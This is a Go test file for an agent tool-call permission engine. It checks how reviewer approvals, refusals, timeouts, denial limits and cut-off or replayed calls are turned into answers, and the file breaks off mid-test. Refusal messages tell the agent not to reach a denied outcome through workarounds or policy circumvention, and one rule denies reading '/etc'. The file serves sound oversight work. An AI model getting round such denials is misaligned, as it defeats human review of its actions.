package agentpolicy

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"reflect"
	"strings"
	"testing"

	"github.com/ChristopherDavenport/agenttool"
	"github.com/ChristopherDavenport/agentturn"
	"github.com/ChristopherDavenport/openresponses"
)

// pendingEnd builds the RunEnd of a run that deferred the given calls.
func pendingEnd(runID string, calls ...*openresponses.FunctionCall) *agentturn.RunEnd {
	end := &agentturn.RunEnd{RunID: runID, Reason: agentturn.ReasonInputRequired}
	for _, c := range calls {
		end.Pending = append(end.Pending, agentturn.PendingCall{Call: c, Reason: agentturn.PendingDeferred})
	}
	return end
}

func TestAnswers(t *testing.T) {
	ctx := context.Background()
	fc := func(id, command string) *openresponses.FunctionCall {
		args, _ := json.Marshal(map[string]string{"command": command})
		return &openresponses.FunctionCall{CallID: id, Name: "bash", Arguments: string(args)}
	}
	// A reviewer keyed by call ID, so one test drives every outcome.
	reviews := map[string]struct {
		rev Review
		err error
	}{
		"approve":      {rev: Review{Outcome: Approved, Reason: "read-only", Note: "keep it read-only"}},
		"approve-args": {rev: Review{Outcome: Approved, Args: json.RawMessage(`{"command":"git status --short"}`)}},
		"refuse":       {rev: Review{Outcome: Refused, Reason: "exfiltrates a token.", Note: "use the vault instead"}},
		"refuse-bare":  {rev: Review{Outcome: Refused}},
		"timeout":      {rev: Review{Outcome: TimedOut}},
		"fail":         {err: errors.New("model unavailable")},
		"zero":         {},
	}
	var seen []Verdict
	reviewer := ReviewerFunc(func(_ context.Context, info agentturn.ToolCallInfo, v Verdict) (Review, error) {
		seen = append(seen, v)
		r := reviews[info.Call.CallID]
		return r.rev, r.err
	})
	j := &journal{}
	e, err := Build(Policy{Ask: rules(t, "bash"), Default: Deny()}, testMatchers, WithObserver(j.observe), WithDenialBound(DenialBound{}))
	if err != nil {
		t.Fatal(err)
	}
	// The engine defers each call in the run, so the reviewer sees the
	// verdict that deferred it.
	var calls []*openresponses.FunctionCall
	for _, id := range []string{"approve", "approve-args", "refuse", "refuse-bare", "timeout", "fail", "zero"} {
		c := fc(id, "git status")
		calls = append(calls, c)
		info := agentturn.ToolCallInfo{RunID: "run_1", Turn: 1, Call: c, Args: json.RawMessage(c.Arguments)}
		if d, _ := e.Decide(ctx, info); d.Action != agentturn.Defer {
			t.Fatalf("%s: %+v", id, d)
		}
	}
	answers, err := e.Answers(ctx, reviewer, pendingEnd("run_1", calls...))
	if err != nil {
		t.Fatal(err)
	}
	for _, v := range seen {
		if v.Action != agentturn.Defer || v.Rule == nil || v.Rule.String() != "bash" || v.Reason != "approval required by bash" || v.RunID != "run_1" || v.Turn != 1 {
			t.Errorf("reviewer saw verdict %+v", v)
		}
	}
	want := []agentturn.Answer{
		agentturn.Approve("approve").WithNote("keep it read-only").WithBy(ByAgent),
		agentturn.ApproveWith("approve-args", json.RawMessage(`{"command":"git status --short"}`)).WithBy(ByAgent),
		// Every answer that is not an approval carries the verdict's
		// reason, which the session recorder writes on the decision.
		agentturn.Output(openresponses.NewFunctionCallOutput("refuse", "Denied by reviewer: exfiltrates a token. Do not pursue the same outcome through a workaround, indirect execution or policy circumvention.")).WithNote("use the vault instead").WithBy(ByAgent).WithReason("denied by reviewer: exfiltrates a token."),
		agentturn.Output(openresponses.NewFunctionCallOutput("refuse-bare", "Denied by reviewer. Do not pursue the same outcome through a workaround, indirect execution or policy circumvention.")).WithBy(ByAgent).WithReason("denied by reviewer"),
		agentturn.Output(openresponses.NewFunctionCallOutput("timeout", "The reviewer did not answer in time; the call did not run.")).WithBy(ByPolicy).WithReason("reviewer timed out"),
		agentturn.Output(openresponses.NewFunctionCallOutput("fail", "The reviewer could not evaluate the call; the call did not run.")).WithBy(ByPolicy).WithReason("reviewer failed: model unavailable"),
		agentturn.Output(openresponses.NewFunctionCallOutput("zero", "Denied by reviewer. Do not pursue the same outcome through a workaround, indirect execution or policy circumvention.")).WithBy(ByAgent).WithReason("denied by reviewer"),
	}
	if !reflect.DeepEqual(answers, want) {
		t.Errorf("answers = %s\nwant %s", dump(answers), dump(want))
	}
	// One verdict per answer, after the seven decisions.
	vs := j.all()[7:]
	wantReasons := []struct {
		action agentturn.ToolAction
		reason string
		// by is who the record names: the reviewer for an answer it
		// gave, the policy for the answers the engine makes on its own.
		by string
	}{
		{agentturn.Allow, "approved by reviewer: read-only", ByAgent},
		{agentturn.Allow, "approved by reviewer", ByAgent},
		{agentturn.Block, "denied by reviewer: exfiltrates a token.", ByAgent},
		{agentturn.Block, "denied by reviewer", ByAgent},
		{agentturn.Block, "reviewer timed out", ByPolicy},
		{agentturn.Block, "reviewer failed: model unavailable", ByPolicy},
		{agentturn.Block, "denied by reviewer", ByAgent},
	}
	if len(vs) != len(wantReasons) {
		t.Fatalf("verdicts = %d, want %d", len(vs), len(wantReasons))
	}
	for i, w := range wantReasons {
		v := vs[i]
		if v.Action != w.action || v.Reason != w.reason || v.CallID != calls[i].CallID || v.Tool != "bash" || v.RunID != "run_1" || v.Turn != 1 || v.Rule != nil {
			t.Errorf("verdict[%d] = %+v, want %v %q", i, v, w.action, w.reason)
		}
		if v.By != w.by {
			t.Errorf("verdict[%d] By = %q, want %q", i, v.By, w.by)
		}
	}

	// A reviewer that asks a person says so, and the verdict carries
	// it: the answer itself will once agentturn's Answer names a
	// decider.
	human := ReviewerFunc(func(context.Context, agentturn.ToolCallInfo, Verdict) (Review, error) {
		return Review{Outcome: Approved, By: ByHuman}, nil
	})
	c := fc("human", "git status")
	if _, err := e.Decide(ctx, agentturn.ToolCallInfo{RunID: "run_2", Turn: 1, Call: c, Args: json.RawMessage(c.Arguments)}); err != nil {
		t.Fatal(err)
	}
	before := len(j.all())
	if _, err := e.Answers(ctx, human, pendingEnd("run_2", c)); err != nil {
		t.Fatal(err)
	}
	if v := j.all()[before]; v.By != ByHuman || v.Action != agentturn.Allow {
		t.Errorf("a human's answer = %+v", v)
	}
}

func dump(v any) string {
	b, _ := json.Marshal(v)
	return string(b)
}

func TestAnswersRecallsTheCallsOfItsOwnRun(t *testing.T) {
	ctx := context.Background()
	var seen []Verdict
	reviewer := ReviewerFunc(func(_ context.Context, info agentturn.ToolCallInfo, v Verdict) (Review, error) {
		seen = append(seen, v)
		if info.Tool != nil {
			t.Errorf("unexpected tool on a forgotten call: %v", info.Tool)
		}
		return Review{Outcome: Approved}, nil
	})
	e, err := Build(Policy{Default: Ask()}, nil)
	if err != nil {
		t.Fatal(err)
	}
	c := &openresponses.FunctionCall{CallID: "c1", Name: "bash", Arguments: `{"command":"ls"}`}
	deferOne := func() {
		if _, err := e.Decide(ctx, agentturn.ToolCallInfo{RunID: "run_1", Turn: 3, Call: c, Args: json.RawMessage(c.Arguments)}); err != nil {
			t.Fatal(err)
		}
	}
	deferOne()
	// A decision for another run does not forget run_1's deferred
	// calls: the reviewer sees the verdict the hook made.
	other := call("c2", "read", `{}`)
	other.RunID = "run_2"
	if _, err := e.Decide(ctx, other); err != nil {
		t.Fatal(err)
	}
	answers, err := e.Answers(ctx, reviewer, pendingEnd("run_1", c))
	if err != nil || len(answers) != 1 || answers[0].CallID != "c1" {
		t.Fatalf("answers = %+v, %v", answers, err)
	}
	want := Verdict{RunID: "run_1", Turn: 3, CallID: "c1", Tool: "bash", Action: agentturn.Defer, Reason: "no rule allows bash: approval required by default", By: ByPolicy}
	if len(seen) != 1 || !reflect.DeepEqual(seen[0], want) {
		t.Errorf("reviewer saw %+v, want %+v", seen, want)
	}
	// A call of a run the engine has forgotten is reviewed with the
	// call alone and an empty reason.
	seen = nil
	deferOne()
	e.Forget("run_1")
	if _, err := e.Answers(ctx, reviewer, pendingEnd("run_1", c)); err != nil {
		t.Fatal(err)
	}
	if want := (Verdict{RunID: "run_1", CallID: "c1", Tool: "bash", Action: agentturn.Defer, By: ByPolicy}); len(seen) != 1 || !reflect.DeepEqual(seen[0], want) {
		t.Errorf("after Forget the reviewer saw %+v, want %+v", seen, want)
	}
	// A call with no arguments is reviewed with an empty object, as the
	// loop would run it.
	seen = nil
	c2 := &openresponses.FunctionCall{CallID: "c3", Name: "bash"}
	var args json.RawMessage
	reviewer = ReviewerFunc(func(_ context.Context, info agentturn.ToolCallInfo, v Verdict) (Review, error) {
		args = info.Args
		return Review{Outcome: Approved}, nil
	})
	if _, err := e.Answers(ctx, reviewer, pendingEnd("run_9", c2)); err != nil || string(args) != "{}" {
		t.Errorf("args = %s, %v", args, err)
	}
}

// A reviewer is shown the arguments a hook rewrote a deferred call to,
// the ones the verdict is about, and an approval runs them: from the
// engine's memory, and from the loop's PendingCall.Args for a call the
// engine has forgotten. (#54)
func TestAnswersReviewsAHooksRewrite(t *testing.T) {
	ctx := context.Background()
	const model, rewritten = `{"command":"curl -O x","escape":true}`, `{"command":"curl -O x"}`
	strip := func(context.Context, agentturn.ToolCallInfo) (*agentturn.ToolDecision, error) {
		return &agentturn.ToolDecision{Args: json.RawMessage(rewritten)}, nil
	}
	c := &openresponses.FunctionCall{CallID: "c1", Name: "bash", Arguments: model}
	tests := []struct {
		name     string
		forget   bool
		pending  json.RawMessage
		review   Review
		wantSeen string
		want     agentturn.Answer
	}{
		{name: "remembered", review: Review{Outcome: Approved}, wantSeen: rewritten, want: agentturn.ApproveWith("c1", json.RawMessage(rewritten)).WithBy(ByAgent)},
		{name: "reviewer's own arguments", review: Review{Outcome: Approved, Args: json.RawMessage(`{"command":"true"}`)}, wantSeen: rewritten, want: agentturn.ApproveWith("c1", json.RawMessage(`{"command":"true"}`)).WithBy(ByAgent)},
		{name: "forgotten, the loop's rewrite", forget: true, pending: json.RawMessage(rewritten), review: Review{Outcome: Approved}, wantSeen: rewritten, want: agentturn.ApproveWith("c1", json.RawMessage(rewritten)).WithBy(ByAgent)},
		{name: "forgotten, no rewrite", forget: true, review: Review{Outcome: Approved}, wantSeen: model, want: agentturn.Approve("c1").WithBy(ByAgent)},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			e, err := Build(Policy{Default: Ask()}, nil, WithHooks(strip))
			if err != nil {
				t.Fatal(err)
			}
			if _, err := e.Decide(ctx, agentturn.ToolCallInfo{RunID: "r", Turn: 1, Call: c, Args: json.RawMessage(model)}); err != nil {
				t.Fatal(err)
			}
			if tc.forget {
				e.Forget("r")
			}
			var seen string
			reviewer := ReviewerFunc(func(_ context.Context, info agentturn.ToolCallInfo, _ Verdict) (Review, error) {
				seen = string(info.Args)
				return tc.review, nil
			})
			end := &agentturn.RunEnd{RunID: "r", Reason: agentturn.ReasonInputRequired, Pending: []agentturn.PendingCall{
				{Call: c, Reason: agentturn.PendingDeferred, Args: tc.pending},
			}}
			answers, err := e.Answers(ctx, reviewer, end)
			if err != nil {
				t.Fatal(err)
			}
			if seen != tc.wantSeen {
				t.Errorf("reviewer saw %s, want %s", seen, tc.wantSeen)
			}
			if !reflect.DeepEqual(answers, []agentturn.Answer{tc.want}) {
				t.Errorf("answers = %s\nwant %s", dump(answers), dump([]agentturn.Answer{tc.want}))
			}
		})
	}
}

func TestAnswersEdgeCases(t *testing.T) {
	ctx := context.Background()
	e, err := Build(Policy{Default: Ask()}, nil)
	if err != nil {
		t.Fatal(err)
	}
	approve := ReviewerFunc(func(context.Context, agentturn.ToolCallInfo, Verdict) (Review, error) {
		return Review{Outcome: Approved}, nil
	})
	// Nothing pending, nothing to answer.
	if answers, err := e.Answers(ctx, approve, nil); answers != nil || err != nil {
		t.Errorf("nil end: %v, %v", answers, err)
	}
	if answers, err := e.Answers(ctx, approve, &agentturn.RunEnd{Reason: agentturn.ReasonDone}); answers != nil || err != nil {
		t.Errorf("nothing pending: %v, %v", answers, err)
	}
	c := &openresponses.FunctionCall{CallID: "c", Name: "bash", Arguments: `{}`}
	// No reviewer is a misuse.
	if _, err := e.Answers(ctx, nil, pendingEnd("r", c)); err == nil || err.Error() != "agentpolicy: no reviewer" {
		t.Errorf("nil reviewer: %v", err)
	}
	// A cancelled context returns its error, not answers: the front is
	// going away and nothing it would resume with is useful.
	cancelled, cancel := context.WithCancel(ctx)
	cancel()
	if answers, err := e.Answers(cancelled, approve, pendingEnd("r", c)); answers != nil || !errors.Is(err, context.Canceled) {
		t.Errorf("cancelled: %v, %v", answers, err)
	}
}

func TestAnswersDenialBound(t *testing.T) {
	ctx := context.Background()
	c := &openresponses.FunctionCall{CallID: "c", Name: "bash", Arguments: `{}`}
	refuse := ReviewerFunc(func(context.Context, agentturn.ToolCallInfo, Verdict) (Review, error) { return Review{}, nil })
	approve := ReviewerFunc(func(context.Context, agentturn.ToolCallInfo, Verdict) (Review, error) {
		return Review{Outcome: Approved}, nil
	})
	timeout := ReviewerFunc(func(context.Context, agentturn.ToolCallInfo, Verdict) (Review, error) {
		return Review{Outcome: TimedOut}, nil
	})

	// Consecutive: the third refusal in a row trips the bound, and the
	// answers still come back so the front can choose.
	e, err := Build(Policy{Default: Ask()}, nil)
	if err != nil {
		t.Fatal(err)
	}
	for i := 1; i <= 2; i++ {
		if _, err := e.Answers(ctx, refuse, pendingEnd("r", c)); err != nil {
			t.Fatalf("refusal %d: %v", i, err)
		}
	}
	answers, err := e.Answers(ctx, timeout, pendingEnd("r", c))
	if !errors.Is(err, ErrDenialBound) || len(answers) != 1 {
		t.Errorf("third refusal: %v, %v", answers, err)
	}
	// The refusals that reach the bound end the run: they are built with
	// Refuse, so Resume appends them and stops instead of calling the
	// model. Before the bound they are plain outputs.
	if !answers[0].Terminate || answers[0].Output == nil {
		t.Errorf("bounded answer = %+v", answers[0])
	}
	if plain, _ := Build(Policy{Default: Ask()}, nil); plain != nil {
		answers, _ := plain.Answers(ctx, refuse, pendingEnd("r", c))
		if answers[0].Terminate {
			t.Errorf("unbounded answer = %+v", answers[0])
		}
	}
	// An approval resets the run of refusals.
	e.ResetReviews()
	for _, r := range []Reviewer{refuse, refuse, approve, refuse, refuse} {
		if _, err := e.Answers(ctx, r, pendingEnd("r", c)); err != nil {
			t.Fatalf("interleaved: %v", err)
		}
	}
	// Total within the window, here three among the last four, with no
	// consecutive bound.
	e, err = Build(Policy{Default: Ask()}, nil, WithDenialBound(DenialBound{Total: 3, Window: 4}))
	if err != nil {
		t.Fatal(err)
	}
	for i, r := range []Reviewer{refuse, refuse, approve, refuse} {
		_, err := e.Answers(ctx, r, pendingEnd("r", c))
		if i < 3 && err != nil {
			t.Fatalf("review %d: %v", i, err)
		}
		if i == 3 && !errors.Is(err, ErrDenialBound) {
			t.Errorf("review %d: %v", i, err)
		}
	}
	// The window slides: an old refusal falls out.
	e.ResetReviews()
	for i, r := range []Reviewer{refuse, refuse, approve, approve, approve, refuse} {
		if _, err := e.Answers(ctx, r, pendingEnd("r", c)); err != nil {
			t.Errorf("sliding review %d: %v", i, err)
		}
	}
	// ResetReviews forgets everything, as a new user turn does.
	e, err = Build(Policy{Default: Ask()}, nil)
	if err != nil {
		t.Fatal(err)
	}
	for i := 0; i < 2; i++ {
		if _, err := e.Answers(ctx, refuse, pendingEnd("r", c)); err != nil {
			t.Fatal(err)
		}
	}
	e.ResetReviews()
	if _, err := e.Answers(ctx, refuse, pendingEnd("r", c)); err != nil {
		t.Errorf("after reset: %v", err)
	}
	// A zero bound never trips.
	e, err = Build(Policy{Default: Ask()}, nil, WithDenialBound(DenialBound{}))
	if err != nil {
		t.Fatal(err)
	}
	for i := 0; i < 100; i++ {
		if _, err := e.Answers(ctx, refuse, pendingEnd("r", c)); err != nil {
			t.Fatalf("unbounded: %v", err)
		}
	}
}

func TestOutcomeString(t *testing.T) {
	for o, want := range map[Outcome]string{Refused: "refused", Approved: "approved", TimedOut: "timed_out", Outcome(9): "refused"} {
		if o.String() != want {
			t.Errorf("%d.String() = %q, want %q", o, o.String(), want)
		}
	}
}

func TestAnswersCutOffCalls(t *testing.T) {
	ctx := context.Background()
	j := &journal{}
	e, err := Build(Policy{Default: Ask()}, nil, WithObserver(j.observe))
	if err != nil {
		t.Fatal(err)
	}
	reviewed := 0
	approve := ReviewerFunc(func(context.Context, agentturn.ToolCallInfo, Verdict) (Review, error) {
		reviewed++
		return Review{Outcome: Approved}, nil
	})
	fc := func(id string) *openresponses.FunctionCall {
		return &openresponses.FunctionCall{CallID: id, Name: "bash", Arguments: `{}`}
	}
	// A call an abort cut off or one found unanswered is not the
	// reviewer's to approve: its tool may have run. It is refused with
	// text that says so; the deferred call is reviewed as ever.
	end := &agentturn.RunEnd{RunID: "r", Reason: agentturn.ReasonAborted, Pending: []agentturn.PendingCall{
		{Call: fc("aborted"), Reason: agentturn.PendingAborted},
		{Call: fc("deferred"), Reason: agentturn.PendingDeferred},
		{Call: fc("unknown"), Reason: agentturn.PendingUnknown},
		{Call: nil},
	}}
	answers, err := e.Answers(ctx, approve, end)
	if err != nil {
		t.Fatal(err)
	}
	want := []agentturn.Answer{
		agentturn.Output(openresponses.NewFunctionCallOutput("aborted", "The call was cut off before it finished and may have run; it was not run again.")).WithBy(ByPolicy).WithReason("not reviewed: aborted"),
		agentturn.Approve("deferred").WithBy(ByAgent),
		agentturn.Output(openresponses.NewFunctionCallOutput("unknown", "The call was cut off before it finished and may have run; it was not run again.")).WithBy(ByPolicy).WithReason("not reviewed: unknown"),
	}
	if !reflect.DeepEqual(answers, want) || reviewed != 1 {
		t.Errorf("answers = %s (reviewed %d)\nwant %s", dump(answers), reviewed, dump(want))
	}
	var reasons []string
	for _, v := range j.all() {
		reasons = append(reasons, v.CallID+" "+v.Reason)
	}
	if got := strings.Join(reasons, "|"); got != "aborted not reviewed: aborted|deferred approved by reviewer|unknown not reviewed: unknown" {
		t.Errorf("verdicts = %q", got)
	}
	// A cut-off call does not count toward the denial bound.
	e, err = Build(Policy{Default: Ask()}, nil, WithDenialBound(DenialBound{Consecutive: 1}))
	if err != nil {
		t.Fatal(err)
	}
	cut := &agentturn.RunEnd{RunID: "r", Reason: agentturn.ReasonAborted, Pending: []agentturn.PendingCall{{Call: fc("aborted"), Reason: agentturn.PendingAborted}}}
	if answers, err := e.Answers(ctx, approve, cut); err != nil || answers[0].Terminate {
		t.Errorf("cut off counted: %s, %v", dump(answers), err)
	}
}

func TestAnswersReleasesHeldCalls(t *testing.T) {
	ctx := context.Background()
	j := &journal{}
	e, err := Build(Policy{Allow: rules(t, "bash(git add:*)"), Ask: rules(t, "bash(git push:*)"), Default: Deny()}, testMatchers, WithObserver(j.observe), WithDenialBound(DenialBound{Consecutive: 1}))
	if err != nil {
		t.Fatal(err)
	}
	var reviewedIDs []string
	reviewer := func(outcome Outcome) Reviewer {
		return ReviewerFunc(func(_ context.Context, info agentturn.ToolCallInfo, _ Verdict) (Review, error) {
			reviewedIDs = append(reviewedIDs, info.Call.CallID)
			return Review{Outcome: outcome}, nil
		})
	}
	hold := func() *agentturn.RunEnd {
		end := &agentturn.RunEnd{RunID: "run_1", Reason: agentturn.ReasonInputRequired}
		for _, info := range batch("run_1", "git add -A", "git push") {
			e.Decide(ctx, info)
			end.Pending = append(end.Pending, agentturn.PendingCall{Call: info.Call, Reason: agentturn.PendingDeferred})
		}
		return end
	}
	// The reviewer sees only the asked call; the held one is released
	// with its approval.
	answers, err := e.Answers(ctx, reviewer(Approved), hold())
	if err != nil || !reflect.DeepEqual(answers, []agentturn.Answer{agentturn.Approve("call_a").WithBy(ByPolicy), agentturn.Approve("call_b").WithBy(ByAgent)}) || strings.Join(reviewedIDs, ",") != "call_b" {
		t.Errorf("approved: %s, %v, reviewed %v", dump(answers), err, reviewedIDs)
	}
	// A refusal at the bound ends the run, so the held call is refused
	// with it.
	reviewedIDs = nil
	answers, err = e.Answers(ctx, reviewer(Refused), hold())
	want := []agentturn.Answer{
		agentturn.Output(openresponses.NewFunctionCallOutput("call_a", "The call was held for an approval and the turn was stopped; the call did not run.")).WithBy(ByPolicy),
		agentturn.Refuse(openresponses.NewFunctionCallOutput("call_b", "Denied by reviewer. Do not pursue the same outcome through a workaround, indirect execution or policy circumvention.")).WithBy(ByAgent).WithReason("denied by reviewer"),
	}
	if !errors.Is(err, ErrDenialBound) || !reflect.DeepEqual(answers, want) || strings.Join(reviewedIDs, ",") != "call_b" {
		t.Errorf("refused: %s, %v, reviewed %v", dump(answers), err, reviewedIDs)
	}
}

// A cut-off call runs again when its tool says a second run is safe,
// is refused as never run when the record says it never started, is
// answered with its output when the record says it ran elsewhere, and
// is approved for the loop to decide when the loop never handed it
// over. The rest are refused as calls that may have run. (#52, #53,
// #63)
func TestAnswersCutOffCallsReadTheirTools(t *testing.T) {
	ctx := context.Background()
	replays := func(name string, r agenttool.Replay) agenttool.Tool {
		run := func(context.Context, agenttool.NoArgs) (string, error) { return "", nil }
		return agenttool.New(name, "A tool", run, agenttool.WithReplay(func(context.Context, json.RawMessage) agenttool.Replay { return r }))
	}
	tools := map[string]agenttool.Tool{
		"read":   replays("read", agenttool.ReplaySafe),
		"remind": replays("remind", agenttool.ReplayKeyed),
		"bash":   replays("bash", agenttool.ReplayUnknown),
	}
	lookup := func(name string) (agenttool.Tool, bool) {
		tool, ok := tools[name]
		return tool, ok
	}
	fc := func(id, name string) *openresponses.FunctionCall {
		return &openresponses.FunctionCall{CallID: id, Name: name, Arguments: `{}`}
	}
	never := func(_ context.Context, runID, callID string) bool {
		return runID == "r" && strings.HasPrefix(callID, "never")
	}
	// The record shows the "ran" calls completed on a branch a rebase
	// left, and knows nothing of the others.
	const where = "ran on a branch the rebase left"
	ran := func(_ context.Context, runID, callID string) (*openresponses.FunctionCallOutput, string) {
		if runID != "r" || !strings.HasPrefix(callID, "ran") {
			return nil, ""
		}
		return &openresponses.FunctionCallOutput{ID: "fco_1", CallID: "other", Status: openresponses.StatusCompleted, Output: openresponses.FunctionCallOutputData{Text: "branch output for " + callID}}, where
	}
	j := &journal{}
	e, err := Build(Policy{Default: Allow()}, nil, WithObserver(j.observe), WithTools(lookup), WithNeverStarted(never), WithRan(ran))
	if err != nil {
		t.Fatal(err)
	}
	end := &agentturn.RunEnd{RunID: "r", Reason: agentturn.ReasonAborted, Pending: []agentturn.PendingCall{
		// The tool the run resolved the call to.
		{Call: fc("safe", "read"), Reason: agentturn.PendingAborted, Tool: tools["read"]},
		// A keyed tool is safe to run again only with its first key.
		{Call: fc("keyed", "remind"), Reason: agentturn.PendingAborted, Tool: tools["remind"], IdempotencyKey: "r/keyed"},
		{Call: fc("keyless", "remind"), Reason: agentturn.PendingUnknown},
		{Call: fc("unknown", "bash"), Reason: agentturn.PendingAborted, Tool: tools["bash"]},
		// A call from a seeded transcript names no tool; WithTools does.
		{Call: fc("seeded", "read"), Reason: agentturn.PendingUnknown},
		{Call: fc("unnamed", "fetch"), Reason: agentturn.PendingUnknown},
		// The record wins over the tool: a call that never started did
		// not run, whatever running it again would do.
		{Call: fc("never", "read"), Reason: agentturn.PendingUnknown},
		// A call the loop never handed over was decided by nothing, and
		// Resume puts an approval of it to the policy: it is approved
		// for that, whatever running it again would do.
		{Call: fc("undispatched", "bash"), Reason: agentturn.PendingUndispatched, Tool: tools["bash"]},
		// An answered call is owed its output and does not run again.
		{Call: fc("answered", "read"), Reason: agentturn.PendingAnswered, Tool: tools["read"]},
		// A rejected call is owed its refusal: it did not run and does
		// not run now, whatever its tool says.
		{Call: fc("rejected", "read"), Reason: agentturn.PendingRejected, Tool: tools["read"]},
		// A call held after its dispatch that may not run again.
		{Call: fc("held", "bash"), Reason: agentturn.PendingDeferred, Tool: tools["bash"], Dispatched: true},
		// The record shows these ran to completion elsewhere: each is
		// answered with that output, and the keyed one is not dispatched
		// again although the replay rule would run it.
		{Call: fc("ran-aborted", "bash"), Reason: agentturn.PendingAborted, Tool: tools["bash"]},
		{Call: fc("ran-keyed", "remind"), Reason: agentturn.PendingAborted, Tool: tools["remind"], IdempotencyKey: "r/ran-keyed"},
		// The record says it never started, so it did not run anywhere.
		{Call: fc("never-ran", "bash"), Reason: agentturn.PendingUnknown},
	}}
	reviewer := ReviewerFunc(func(context.Context, agentturn.ToolCallInfo, Verdict) (Review, error) {
		t.Error("a cut-off call reached the reviewer")
		return Review{}, nil
	})
	answers, err := e.Answers(ctx, reviewer, end)
	if err != nil {
		t.Fatal(err)
	}
	const (
		cut      = "The call was cut off before it finished and may have run; it was not run again."
		notRun   = "The call was cut off before it started; it did not run."
		rejected = "The call was refused before it ran; it did not run."
	)
	const (
		safe  = "run again: replay safe; allowed by default"
		keyed = "run again: replay keyed; allowed by default"
	)
	// The branch's output, as the record gave it: its call ID is the
	// pending call's, and its item ID is not carried over.
	branch := func(id string) *openresponses.FunctionCallOutput {
		return &openresponses.FunctionCallOutput{CallID: id, Status: openresponses.StatusCompleted, Output: openresponses.FunctionCallOutputData{Text: "branch output for " + id}}
	}
	want := []agentturn.Answer{
		agentturn.Approve("safe").WithBy(ByPolicy).WithReason(safe),
		agentturn.Approve("keyed").WithBy(ByPolicy).WithReason(keyed),
		agentturn.Output(openresponses.NewFunctionCallOutput("keyless", cut)).WithBy(ByPolicy).WithReason("not reviewed: unknown"),
		agentturn.Output(openresponses.NewFunctionCallOutput("unknown", cut)).WithBy(ByPolicy).WithReason("not reviewed: aborted"),
		agentturn.Approve("seeded").WithBy(ByPolicy).WithReason(safe),
		agentturn.Output(openresponses.NewFunctionCallOutput("unnamed", cut)).WithBy(ByPolicy).WithReason("not reviewed: unknown"),
		agentturn.Output(openresponses.NewFunctionCallOutput("never", notRun)).WithBy(ByPolicy).WithReason("not run: the call never started"),
		agentturn.Approve("undispatched").WithBy(ByPolicy).WithReason("not started: decided on resume"),
		agentturn.Output(openresponses.NewFunctionCallOutput("answered", cut)).WithBy(ByPolicy).WithReason("not reviewed: answered"),
		agentturn.Output(openresponses.NewFunctionCallOutput("rejected", rejected)).WithBy(ByPolicy).WithReason("not run: the call was refused before it ran"),
		agentturn.Output(openresponses.NewFunctionCallOutput("held", cut)).WithBy(ByPolicy).WithReason("not reviewed: deferred"),
		agentturn.Output(branch("ran-aborted")).WithBy(ByPolicy).WithReason(where),
		agentturn.Output(branch("ran-keyed")).WithBy(ByPolicy).WithReason(where),
		agentturn.Output(openresponses.NewFunctionCallOutput("never-ran", notRun)).WithBy(ByPolicy).WithReason("not run: the call never started"),
	}
	if !reflect.DeepEqual(answers, want) {
		t.Errorf("answers = %s\nwant %s", dump(answers), dump(want))
	}
	var got []string
	for _, v := range j.all() {
		got = append(got, fmt.Sprintf("%s %v %s", v.CallID, v.Action, v.Reason))
	}
	wantVerdicts := []string{
		fmt.Sprintf("safe %v %s", agentturn.Allow, safe),
		fmt.Sprintf("keyed %v %s", agentturn.Allow, keyed),
		fmt.Sprintf("keyless %v not reviewed: unknown", agentturn.Block),
		fmt.Sprintf("unknown %v not reviewed: aborted", agentturn.Block),
		fmt.Sprintf("seeded %v %s", agentturn.Allow, safe),
		fmt.Sprintf("unnamed %v not reviewed: unknown", agentturn.Block),
		fmt.Sprintf("never %v not run: the call never started", agentturn.Block),
		// The undispatched call's approval is no verdict: the decision
		// the loop's BeforeToolCall makes on resume is.
		fmt.Sprintf("answered %v not reviewed: answered", agentturn.Block),
		fmt.Sprintf("rejected %v not run: the call was refused before it ran", agentturn.Block),
		fmt.Sprintf("held %v not reviewed: deferred", agentturn.Block),
		fmt.Sprintf("ran-aborted %v %s", agentturn.Allow, where),
		fmt.Sprintf("ran-keyed %v %s", agentturn.Allow, where),
		fmt.Sprintf("never-ran %v not run: the call never started", agentturn.Block),
	}
	if !reflect.DeepEqual(got, wantVerdicts) {
		t.Errorf("verdicts = %q\nwant %q", got, wantVerdicts)
	}
	for _, v := range j.all() {
		if v.Rule != nil || v.By != ByPolicy {
			t.Errorf("verdict %s: rule %v by %q", v.CallID, v.Rule, v.By)
		}
	}
	// None of these counts toward the denial bound.
	e, err = Build(Policy{Default: Allow()}, nil, WithTools(lookup), WithNeverStarted(never), WithRan(ran), WithDenialBound(DenialBound{Consecutive: 1}))
	if err != nil {
		t.Fatal(err)
	}
	answers, err = e.Answers(ctx, reviewer, end)
	if err != nil {
		t.Fatal(err)
	}
	for _, a := range answers {
		if a.Terminate {
			t.Errorf("%s counted toward the bound", a.CallID)
		}
	}
}

// A call that may run again is decided under the policy first: a call
// a seeded transcript left was perhaps never decided, and one that was
// waiting on the user when the product stopped runs again only when
// someone answers. An ask goes to the reviewer with the policy's
// verdict, a deny is refused with its reason, and a hook's rewrite
// is what an approval runs with. (#46)
func TestAnswersDecidesAReplayUnderThePolicy(t *testing.T) {
	ctx := context.Background()
	run := func(context.Context, agenttool.NoArgs) (string, error) { return "", nil }
	safe := func(name string) agenttool.Tool {
		return agenttool.New(name, "A tool", run, agenttool.WithReplay(func(context.Context, json.RawMessage) agenttool.Replay { return agenttool.ReplaySafe }))
	}
	tools := map[string]agenttool.Tool{"web_fetch": safe("web_fetch"), "read": safe("read"), "list": safe("list")}
	lookup := func(name string) (agenttool.Tool, bool) {
		tool, ok := tools[name]
		return tool, ok
	}
	pol := Policy{
		Allow:   []Rule{{Tool: "read"}, {Tool: "list"}},
		Ask:     []Rule{{Tool: "web_fetch"}},
		Deny:    []Rule{{Tool: "read", Spec: "/etc:*"}},
		Default: Allow(),
	}
	rewrite := func(_ context.Context, info agentturn.ToolCallInfo) (*agentturn.ToolDecision, error) {
		if info.Call.Name == "list" {
			return &agentturn.ToolDecision{Args: json.RawMessage(`{"path":"/srv"}`)}, nil
		}
		return nil, nil
	}
	j := &journal{}
	e, err := Build(pol, testMatchers, WithObserver(j.observe), WithTools(lookup), WithHooks(rewrite))
	if err != nil {
		t.Fatal(err)
	}
	fc := func(id, name, args string) *openresponses.FunctionCall {
		return &openresponses.FunctionCall{CallID: id, Name: name, Arguments: args}
	}
	end := &agentturn.RunEnd{RunID: "r", Reason: agentturn.ReasonAborted, Pending: []agentturn.PendingCall{
